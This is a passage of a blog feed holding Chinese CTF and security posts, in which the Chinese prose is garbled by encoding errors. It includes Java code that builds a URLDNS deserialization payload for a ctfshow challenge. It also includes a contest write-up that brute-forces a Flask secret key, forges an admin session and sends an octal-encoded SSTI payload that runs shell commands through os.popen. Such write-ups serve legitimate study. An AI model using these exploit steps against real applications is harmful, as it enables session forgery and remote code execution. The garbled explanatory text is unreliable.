text"><br>æˆ‘ä»¬ä¼šå‘ç°å…¶æ‰§è¡Œäº†key.hashCode()ã€‚è¿™ä¸ªkeyçš„å€¼å¯ä»¥ä¸ºç±»ã€‚</p><p>æˆ‘ä»¬å†çœ‹URL<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥å†URLç±»ä¸‹æ‰¾åˆ°hashCodeè¿™ä¸ªæ–¹æ³•,è€Œè¿™ä¸ªæ–¹æ³•ä¸‹è¿˜æœ‰ä¸€ä¸ªhashCode()æˆ‘ä»¬æ­¥å…¥è¿™ä¸ªæ–¹æ³•<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png" class="" title="alt text"><br>ä¼šå‘ç°å…¶è°ƒç”¨äº†getHostAddress(u);<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png" class="" title="alt text"><br>å†æ­¥å…¥å°±ä¼šå‘ç°InetAddress.getByName(host)ï¼Œè¿™ä¸ªæ–¹æ³•çš„ä½œç”¨æ˜¯æ ¹æ®ä¸»æœºåå¾—åˆ°ipï¼Œé‚£ä¹ˆè‚¯å®šä¼šæœ‰ä¸€æ¬¡è®¿é—®ã€‚<br>é‚£ä¹ˆå°±ä¼šæœ‰DNSè®°å½•ã€‚è€Œå…¶å‚æ•°hostï¼Œå…¶å®å°±æ˜¯getHostAddressçš„å‚æ•°uä¹Ÿå°±æ˜¯hashCodeçš„å‚æ•°å³thisã€‚<br>æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png" class="" title="alt text"><br>å¯ä»¥å‘ç°å½“æˆ‘ä»¬ä¼ å…¥å•å‚æ•°æ˜¯å…¶ä¼šç›´æ¥å°†æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°è½½å…¥ã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦å†å®ä¾‹åŒ–æ—¶ä¼ å…¥URLå³å¯</p><p>å³è¿™ä¸ªé“¾å­å…¶å®å°±å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.HashMap-&gt;readObject()</span><br><span class="line">2.HashMap-&gt;hash()-&gt;key.hashCode();</span><br><span class="line">3.URL-&gt;hashCode();</span><br><span class="line">4.URLStreamHandler-&gt;hashCode();</span><br><span class="line">5.URLStreamHandler-&gt;getHostAddress(u)</span><br><span class="line">6.InetAddress-&gt;getByName(host)</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°è¿™ä¸ªé“¾å­å¾ˆçŸ­ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç›´æ¥å°†URLä¼ å…¥hashmapå¦‚ä¸‹ä»£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.DoubleSummaryStatistics;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://13e8d7e2-18e9-4d1b-bff3-7a6a8768d21d.challenge.ctf.show/&quot;</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        Serializ(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä¼šå‘ç°å…¶å¹¶ä¸ä¼šå¦‚è®¾æƒ³é‚£æ ·åœ¨ååºåˆ—æ—¶è¿›è¡Œè¯·æ±‚ï¼Œåè€Œæ˜¯å½“æˆ‘ä»¬åºåˆ—åŒ–æ—¶å…¶å‘é€äº†è¯·æ±‚ï¼Œè€Œååºåˆ—æ—¶å´æ²¡æœ‰è¿›è¡Œè¯·æ±‚ã€‚</p><h3 id="é—®é¢˜1ä¸ºä»€ä¹ˆåºåˆ—åŒ–æ—¶ä¼šè¿›è¡Œè¯·æ±‚ã€‚"><a href="#é—®é¢˜1ä¸ºä»€ä¹ˆåºåˆ—åŒ–æ—¶ä¼šè¿›è¡Œè¯·æ±‚ã€‚" class="headerlink" title="é—®é¢˜1ä¸ºä»€ä¹ˆåºåˆ—åŒ–æ—¶ä¼šè¿›è¡Œè¯·æ±‚ã€‚"></a>é—®é¢˜1ä¸ºä»€ä¹ˆåºåˆ—åŒ–æ—¶ä¼šè¿›è¡Œè¯·æ±‚ã€‚</h3><p>æˆ‘ä»¬å…ˆæ¥åˆ†æä¸ºä»€ä¹ˆåœ¨åºåˆ—åŒ–æ—¶ä¼šå‘ç°è¯·æ±‚<br>å…¶ä¸»è¦æ˜¯è¿™ä¸ªçŸ­ä»£ç çš„åŸå› <br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashmap.put(url,1);</span><br></pre></td></tr></table></figure><br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥å‘ç°HashMapçš„putè¿™ä¸ªæ–¹æ³•ä¹Ÿè°ƒç”¨äº†hashcodeè¿™ä¸ªæ–¹æ³•è¿™å°±å¯¼è‡´å…¶ä¹Ÿä¼šè°ƒç”¨url.hashCodeå¯¼è‡´è¿›è¡Œä¸€æ¬¡è¯·æ±‚</p><h3 id="é—®é¢˜2-ä¸ºä»€ä¹ˆååºåˆ—åŒ–æ—¶æ²¡æœ‰è¿›è¡Œè¯·æ±‚"><a href="#é—®é¢˜2-ä¸ºä»€ä¹ˆååºåˆ—åŒ–æ—¶æ²¡æœ‰è¿›è¡Œè¯·æ±‚" class="headerlink" title="é—®é¢˜2 ä¸ºä»€ä¹ˆååºåˆ—åŒ–æ—¶æ²¡æœ‰è¿›è¡Œè¯·æ±‚"></a>é—®é¢˜2 ä¸ºä»€ä¹ˆååºåˆ—åŒ–æ—¶æ²¡æœ‰è¿›è¡Œè¯·æ±‚</h3><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png" class="" title="alt text"><p>æˆ‘ä»¬æŸ¥çœ‹URLçš„hashCodeä¼šå‘ç°å…¶è¿›è¡Œäº†ä¸€æ¬¡åˆ¤æ–­åªæœ‰å½“hashCodeè¿™ä¸ªæˆå‘˜å±æ€§ä¸º-1æ—¶æ‰ä¼šç»§ç»­æ‰§è¡Œï¼Œå¦‚æœä¸ä¸º-1é‚£ä¹ˆå°±ä¸ä¼šè¿›è¡Œè¯·æ±‚ã€‚<br>è€Œåœ¨æ‰§è¡Œåæˆ‘ä»¬ä¼šå‘ç°hashCodeè¢«èµ‹å€¼ä¸ºhandler.hashCode(this);<br>è€Œåœ¨æˆ‘ä»¬åºåˆ—åŒ–æ‰§è¡Œåˆ°hashmap.putæ—¶å…¶è¿›è¡Œäº†ä¸€æ¬¡è¯·æ±‚é‚£ä¹ˆhashCodeçš„å€¼å°±ä¸ä¸º-1äº†<br>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆååºåˆ—æ—¶æ— æ³•æˆåŠŸè¿›è¡ŒDNSè¯·æ±‚</p><h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¹‹å‰å­¦çš„åå°„æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚<br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå°„å³getDeclaredField()æ–¹æ³•æ¥å¾—åˆ°URLç±»çš„hashCodeå±æ€§ï¼Œç„¶ååˆ©ç”¨åå°„æ¥æ›´æ”¹urlå®ä¾‹å¯¹è±¡çš„hashCodeçš„å€¼ä»£ç å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.DoubleSummaryStatistics;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://13e8d7e2-18e9-4d1b-bff3-7a6a8768d21d.challenge.ctf.show/&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        System.out.println(hashcodefield);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">123</span>);<span class="comment">//å°†hashCodeæ›´æ”¹ä¸º123ä½¿å¾—hashmap.putæ— æ³•å‘é€è¯·æ±‚</span></span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);<span class="comment">// è¿™é‡ŒæŠŠ hashCode æ”¹ä¸º -1ï¼› é€šè¿‡åå°„çš„æŠ€æœ¯æ”¹å˜å·²æœ‰å¯¹è±¡çš„å±æ€§</span></span><br><span class="line">        Serializ(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png" class="" title="alt text"></p><h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><h2 id="ctfshow-web846"><a href="#ctfshow-web846" class="headerlink" title="ctfshow web846"></a>ctfshow web846</h2><p>exp<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.DoubleSummaryStatistics;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="comment">// è¿™é‡Œä¸è¦å‘èµ·è¯·æ±‚</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://76158ba6-2e62-456a-8da2-ee48a5f6cb58.challenge.ctf.show/&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        System.out.println(hashcodefield);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">123</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// è¿™é‡ŒæŠŠ hashCode æ”¹ä¸º -1ï¼› é€šè¿‡åå°„çš„æŠ€æœ¯æ”¹å˜å·²æœ‰å¯¹è±¡çš„å±æ€§</span></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        Serializ(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>é¢˜ç›®è¦æ±‚æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªbaseç¼–ç çš„åºåˆ—åŒ–å­—ç¬¦è®©å…¶ååºåˆ—åŒ–ï¼Œç„¶åDNSè¯·æ±‚é¢˜ç›®çš„ç½‘ç«™<br>æˆ‘ä»¬ä½¿ç”¨URLDNSé“¾<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.png" class="" title="alt text"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é•¿åŸæ¯å¤ç°</title>
      <link href="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLUP"><a href="#SQLUP" class="headerlink" title="SQLUP"></a>SQLUP</h1><p>ç™»é™†ä¹‹åæ–‡ä»¶ä¸Šä¼ ä¸å¤šè¯´</p><h1 id="CandyShop"><a href="#CandyShop" class="headerlink" title="CandyShop"></a>CandyShop</h1><p>åœ¨æ¯”èµ›çš„æ—¶å€™ä»¥ä¸ºè¿™ä¸ªæ˜¯ç”¨æ¡ä»¶ç«äº‰æ¥å†™ï¼Œæˆ‘å¤ªå‚»äº†<br>èµ›åçœ‹äº†wp å‘ç°SECRET_KEYç«Ÿç„¶å¯ä»¥çˆ†ç ´å‡ºæ¥<br>ä½¿ç”¨flask-unsignå¯ä»¥å¯¹keyè¿›è¡Œçˆ†ç ´<br>ç”¨æ³•<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------åŠ å¯†</span><br><span class="line">PS C:\Users\24882&gt; C:\Users\24882\AppData\Roaming\Python\Python312\Scripts\flask-unsign.exe -d -c <span class="string">&quot;.eJwNy0sKgCAQANC7zLpFTqTWZWJ0xpDQwM8iorvn9sF7wdcSjnZfkmEHH3CxOHtjcWPSMqvgtCOFmp2xTM4gB8srTBBZcovtGevsUtugXqVkSjKIOMUM3w-UGR5A.Zt2O4Q.FR2Rf6GsDgArFUTCs69-3mqInJ8&quot;</span> -S <span class="string">&quot;a123456&quot;</span></span><br><span class="line"></span><br><span class="line">-----------------------------è§£ç </span><br><span class="line"></span><br><span class="line">PS C:\Users\24882&gt; C:\Users\24882\AppData\Roaming\Python\Python312\Scripts\flask-unsign.exe -s -c <span class="string">&quot;&#123;&#x27;csrf_token&#x27;: &#x27;cf23820c7829da6e01fb6ba126db78dab72df8d5&#x27;, &#x27;identity&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot;</span> -S <span class="string">&quot;a123456&quot;</span></span><br></pre></td></tr></table></figure><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">çˆ†ç ´</span><br><span class="line">C:\Users\24882\AppData\Roaming\Python\Python312\Scripts\flask-unsign.exe -u -c <span class="string">&quot;.eJwNy0sKgCAQANC7zLpFTqTWZWJ0xpDQwM8iorvn9sF7wdcSjnZfkmEHH3CxOHtjcWPSMqvgtCOFmp2xTM4gB8srTBBZcovtGevsUtugXqVkSjKIOMUM3w-UGR5A.Zt2O4Q.FR2Rf6GsDgArFUTCs69-3mqInJ8&quot;</span></span><br></pre></td></tr></table></figure><br>ç»è¿‡çˆ†ç ´å¾—å‡ºæ¥keyçš„å€¼ä¸ºa123456<br><br>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œsessionä¼ªé€ äº†<br>æŸ¥çœ‹æºç æˆ‘ä»¬ä¼šå‘ç°adminè·¯ç”±ä¸‹å­˜åœ¨åŸå‹é“¾æ±¡æŸ“<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    identity = session.get(<span class="string">&#x27;identity&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> identity != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">    admin = Admin()</span><br><span class="line">    merge(session, admin)</span><br><span class="line">    admin_user.append(admin)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, view=<span class="string">&#x27;index&#x27;</span>)</span><br></pre></td></tr></table></figure><br>å¹¶ä¸”mergeå‡½æ•°æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆåŸå‹é“¾æ±¡æŸ“ä¸€ä¸‹soldæ¥çœ‹ä¸€ä¸‹secret.txtæ˜¯ä»€ä¹ˆ<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l</span><br><span class="line">C:\Users\24882\AppData\Roaming\Python\Python312\Scripts\flask-unsign.exe -s -c <span class="string">&quot;&#123;&#x27;csrf_token&#x27;: &#x27;cf23820c7829da6e01fb6ba126db78dab72df8d5&#x27;, &#x27;identity&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;,&#x27;__init__&#x27;:&#123;&#x27;__globals__&#x27;:&#123;&#x27;sold&#x27;:503&#125;&#125;&#125;&quot;</span> -S <span class="string">&quot;a123456&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬èƒ½è¯»å–åˆ°secret.txtçš„å†…å®¹ä½†æ˜¯å› ä¸ºæˆ‘è¿™æ˜¯èµ›åå¤ç°å¯¼è‡´åƒè¿™äº›æ–‡ä»¶çš„å†…å®¹æˆ‘åªèƒ½é€šè¿‡wpæ¥çŸ¥æ™“ã€‚å†…å®¹ä¸º /tmp/xxxxxx/xxxxxx/flag<br>è¿™å°±éœ€è¦æˆ‘ä»¬è¿›è¡Œå‘½ä»¤æ‰§è¡Œåå¯»æ‰¾flag<br>ç»è¿‡å¾…å®¡æˆ‘ä»¬ä¼šå‘ç°å¦‚ä¸‹ä»£ç <br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize_inventory_sold</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&#x27;[a-zA-Z_]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/view_inventory&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_inventory</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    identity = session.get(<span class="string">&#x27;identity&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> identity != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">    inventory_value = sanitize_inventory_sold(inventory)</span><br><span class="line">    sold_value = sanitize_inventory_sold(sold)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;å•†åº—åº“å­˜:&quot;</span> + inventory_value + <span class="string">&quot;å·²å”®å‡º&quot;</span> + sold_value)</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬ä¼šå‘ç°å…¶ä¸å…è®¸æˆ‘ä»¬ä½¿ç”¨å­—æ¯ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨[]+å…«è¿›åˆ¶çš„æ–¹æ³•æ¥è¿›è¡Œssti<br>æœ€ç»ˆpayloadå¦‚ä¸‹<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign -s -c <span class="string">&quot;&#123;&#x27;csrf_token&#x27;: &#x27;cf23820c7829da6e01fb6ba126db78dab72df8d5&#x27;, &#x27;identity&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;,&#x27;__init__&#x27;:&#123;&#x27;__globals__&#x27;:&#123;&#x27;sold&#x27;:&#x27;&#123;&#123;()[\&#x27;\\137\\137\\143\\154\\141\\163\\163\\137\\137\&#x27;][\&#x27;\\137\\137\\142\\141\\163\\163\\137\\137\&#x27;][\&#x27;\\137\\137\\142\\141\\163\\145\\137\\137\&#x27;][\&#x27;\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137\&#x27;]()[161][\&#x27;\\137\\137\\151\\156\\151\\164\\137\\137\&#x27;][\&#x27;\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137\&#x27;][\&#x27;\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137\&#x27;][\&#x27;\\145\\166\\141\\154\&#x27;](\&#x27;\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\50\\42\\157\\163\\42\\51\\56\\160\\157\\160\\145\\156\\50\\42\\167\\150\\157\\141\\155\\151\\42\\51\\56\\162\\145\\141\\144\\50\\51\&#x27;)&#125;&#125;&#x27;&#125;&#125;&#125;&quot;</span> -S <span class="string">&quot;a123456&quot;</span></span><br></pre></td></tr></table></figure><br></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI</title>
      <link href="/2024/09/07/RMI/"/>
      <url>/2024/09/07/RMI/</url>
      
